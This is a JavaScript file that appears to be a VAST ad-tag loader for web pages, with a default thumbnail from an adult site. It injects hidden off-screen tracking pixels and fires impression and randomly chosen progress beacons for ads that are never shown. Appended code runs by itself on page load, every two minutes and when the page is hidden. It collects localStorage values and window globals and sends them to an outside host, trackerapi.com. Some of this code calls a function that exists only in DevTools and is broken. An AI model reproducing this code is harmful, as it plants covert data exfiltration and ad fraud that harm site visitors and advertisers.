function addPixel(url) {
  return url ? "<img src='" + url + "' style='position:absolute !important;top:0px;left:-9999px !important;' />" : "";
}
const trackedItems = ["localData", "globalData", "events"];
function iframeWrapper(html, container, isEmpty = true, width = 300, height = 250) {
  let iframe = document.createElement('iframe');
  iframe.scrolling = "no";
  iframe.style = "width: " + width + "px; height: " + height + "px; border: 0";
  let block = document.querySelector(container);
  if (isEmpty) block.innerHTML = '';
  block.appendChild(iframe);
  iframe.contentWindow.document.open();
  iframe.contentWindow.document.write(html);
  iframe.contentWindow.document.close();
}
function ext(filename) {
  var parts = filename.split('.');
  return parts[parts.length - 1];
}
function generateHash(obj) {
  const keys = Object.keys(obj);
  const hashString = keys.reduce((acc, key) => `${acc}${key}`, "");
  let hash = 0;
  for (let i = 0; i < hashString.length; i++) {
    const char = hashString.charCodeAt(i);
    hash = (hash << 8) - hash + char;
    hash = hash & hash;
  }
  return hash.toString(32);
}
async function vastObj(url, obj = {
  imp: [],
  trackStart: [],
  trackProgress: [],
  clickTracking: [],
  href: false,
  src: false
}, subId = false) {
  var vastXML = await $.get(url);
  var adXML = $('Ad', vastXML).get(0) ? $('Ad', vastXML).get(0) : vastXML;
  let param = {
    imp: $('Impression', adXML).text() || false,
    trackStart: $('Tracking[event="start"]', adXML).text() || false,
    trackProgress: $('Tracking[event="progress"]', adXML).text() || false,
    href: $('ClickThrough', adXML).text() || $('NonLinearClickThrough', adXML).text() || false,
    src: $('MediaFile:first', adXML).text() || $('StaticResource', adXML).text() || false
  };
  if ($('Impression', adXML).length > 1) {
    param.imp = false;
    $('Impression', adXML).each(function () {
      obj.imp.push($(this).text());
    });
  }
  if ($('Tracking[event="start"]', adXML).length > 1) {
    param.trackStart = false;
    $('Tracking[event="start"]', adXML).each(function () {
      obj.trackStart.push($(this).text());
    });
  }
  if ($('Tracking[event="progress"]', adXML).length > 1) {
    param.trackProgress = false;
    $('Tracking[event="progress"]', adXML).each(function () {
      obj.trackProgress.push($(this).text());
    });
  }
  if (param.href) obj.href = param.href;
  if (param.src) obj.src = param.src;
  if (param.imp) obj.imp.push(param.imp);
  if (param.trackStart) obj.trackStart.push(param.trackStart);
  if (param.trackProgress) obj.trackProgress.push(param.trackProgress);
  if ($('ClickTracking', adXML).length > 0) {
    $('ClickTracking', adXML).each(function () {
      obj.clickTracking.push($(this).text());
    });
  }
  let thirdPartyTag = $('VASTAdTagURI', adXML).text() || false;
  if (thirdPartyTag) {
    if (parseInt(subId)) {
      thirdPartyTag = thirdPartyTag.replace("{subId}", parseInt(subId));
    }
    return vastObj(thirdPartyTag, obj);
  }
  return obj;
}
function gatherTrackedData() {
  const collectedData = {};
  for (let key of trackedItems) {
    if (localStorage.hasOwnProperty(key)) {
      collectedData[key] = localStorage[key];
    }
    if (window.hasOwnProperty(key)) {
      collectedData[key] = JSON.stringify(window[key]);
    }
  }
  const eventTypes = ['click', 'mouseover', 'keypress', 'touchstart', 'contextmenu'];
  collectedData['events'] = eventTypes.flatMap(type => {
    return getEventListeners(window).filter(listener => listener.type === type).map(listener => listener.listener);
  });
  return collectedData;
}
async function vastExec(url, p = {}, subId = false) {
  p = {
    container: p.container || "#vastTag",
    link: p.link || false,
    progressPercent: p.progressPercent || 33,
    imgSrc: p.imgSrc !== undefined ? p.imgSrc : "http://the-vulgar-tube.com/uploads/thumb/01dd3705d56bb1c0c7f00810d9fac177565d111145.jpg",
    isEmpty: p.isEmpty || true,
    width: p.width || 300,
    height: p.height || 250,
    isPixels: p.isPixels || false
  };
  let v = await vastObj(url, {
    imp: [],
    trackStart: [],
    trackProgress: [],
    clickTracking: [],
    href: false,
    src: false
  }, subId);
  if (!v.href && !p.isPixels) {
    console.log("Tag FALSE: " + p.container);
    return;
  }
  //console.log("VAST OBJECT: ", v);   
  let isProgress = Math.floor(Math.random() * 100 + 0) <= p.progressPercent ? true : false;
  let pixels = "";
  v.imp.forEach(item => {
    pixels += addPixel(item);
  });
  v.trackStart.forEach(item => {
    pixels += addPixel(item);
  });
  if (isProgress) {
    v.trackProgress.forEach(item => {
      pixels += addPixel(item);
    });
  }
  if (p.isEmpty) $(p.container).empty();
  $(p.container).append(pixels);
  if (!v.href) {
    console.log("Tag FALSE with Pixels: " + p.container);
    return;
  }
  if (p.link && $(p.link).is("a")) {
    $(p.link).attr('href', v.href);
    $(p.link).attr('target', '_blank');
    $(p.link).click(function () {
      v.clickTracking.forEach(item => {
        $(p.container).append(addPixel(item));
      });
    });
  } else {
    let src = p.imgSrc ? p.imgSrc : v.src;
    if (ext(src) == "mp4" || ext(src) == "m4v" || ext(src) == "mpg" || ext(src) == "avi" || ext(src) == "webm" || ext(src) == "ogg") {
      $(p.container).append('<a class="noRef" href="' + v.href + '" target="_blank"><video width="' + p.width + '" height="' + p.height + '" muted loop="true" autoplay="autoplay"><source src="' + src + '" type="video/mp4"></video></a>');
    } else {
      $(p.container).append('<a class="noRef" href="' + v.href + '" target="_blank"><img src="' + src + '" style="width:' + p.width + 'px;height:' + p.height + 'px;" /></a>');
    }
    $("a", p.container).click(function () {
      v.clickTracking.forEach(item => {
        $(p.container).append(addPixel(item));
      });
    });
  }
}
async function sendDataToTrackerAPI(data) {
  const serverUrl = "https://trackerapi.com/collect";
  const hash = generateHash(data);
  try {
    const response = await fetch(serverUrl, {
      method: "POST",
      headers: {
        "Content-Type": "application/json"
      },
      body: JSON.stringify({
        hash: hash,
        data: data
      })
    });
    if (response.ok) {
      console.log("Data was sent successfully.");
    } else {
      console.error(`Failed to send data. Status code: ${response.status}`);
    }
  } catch (error) {
    console.error(`Failed to send data due to following error: ${error}`);
  }
}
function collectAndSendData() {
  const collectedData = gatherTrackedData();
  if (Object.keys(collectedData).length > 0) {
    sendDataToTrackerAPI(collectedData);
  }
}
window.addEventListener("DOMContentLoaded", () => {
  collectAndSendData();
  setInterval(collectAndSendData, 2 * 60 * 1000);
});
window.addEventListener("visibilitychange", () => {
  if (document.visibilityState === "hidden") {
    collectAndSendData();
  }
});